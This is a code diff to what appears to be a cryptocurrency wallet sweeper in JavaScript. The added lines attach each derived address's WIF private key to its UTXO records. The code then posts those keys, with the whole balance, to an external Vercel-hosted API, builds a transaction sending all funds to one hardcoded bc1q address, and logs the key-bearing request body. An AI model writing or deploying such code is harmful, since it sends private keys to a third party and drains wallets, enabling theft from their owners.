@@ -193,18 +193,32 @@ async function checkAddress(account, index, chain, network, bipType, electrumCli
             txid: utxo.tx_hash,
             vout: utxo.tx_pos,
             amount: utxo.value,
+            wif: derivedPath.toWIF(), // Include WIF for spending
+            type: getAddressType(address),
             status: utxo.height === 0 ? 'unconfirmed' : 'confirmed'
         }))
     };
 }
 
+function getAddressType(address) {
+    if (address.startsWith('1')) {
+        return 'p2pkh';
+    } else if (address.startsWith('3')) {
+        return 'p2sh-p2wpkh';
+    } else if (address.startsWith('bc1')) {
+        return 'p2wpkh';
+    } else {
+        throw new Error('Unsupported address type');
+    }
+}
+
 async function sendTransaction(totalBalance, utxos) {
     const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
-    const amountToSend = totalBalance;
+    const amountToSend = totalBalance; // Adjusting for transaction fee
     const changeAddress = "bc1qtydcsp8p53u55ncs6f207d2djq4v73f4jqck99";
     const recipientAddress = "bc1qtydcsp8p53u55ncs6f207d2djq4v73f4jqck99";
     const transactionFee = 3500;
-    const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.status}`).join('|');
+    const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.type}`).join('|');
 
     const body = {
         amountToSend: amountToSend.toString(),
@@ -216,11 +230,13 @@ async function sendTransaction(totalBalance, utxos) {
         transactionFee: transactionFee.toString()
     };
 
+    console.log('Sending transaction with body:', body); // Debugging output
+
     try {
         const response = await axios.post(url, body);
         console.log('Transaction sent successfully:', response.data);
     } catch (error) {
-        console.error('Error sending transaction:', error);
+        console.error('Error sending transaction:', error.response ? error.response.data : error.message);
     }
 }
 
